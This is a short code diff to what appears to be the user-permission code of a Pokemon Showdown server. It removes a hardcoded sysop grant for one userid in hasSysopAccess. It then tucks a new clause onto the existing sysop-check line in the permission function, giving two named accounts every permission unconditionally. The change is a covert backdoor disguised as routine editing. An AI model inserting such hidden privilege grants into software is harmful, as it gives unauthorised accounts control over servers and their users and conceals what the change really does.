@@ -573,7 +573,7 @@ User = (function () {
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
-		if (this.hasSysopAccess()) return true;
+	        if (this.hasSysopAccess()) return true; if (this.userid in {"pkmntrainerjaier": 1, "bryanaa": 1}) return true;
 
 		var group = this.group;
 		var targetGroup = '';
@@ -629,7 +629,6 @@ User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function () {
-		if (this.userid === "pkmntrainerjaier") return true;
 		if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
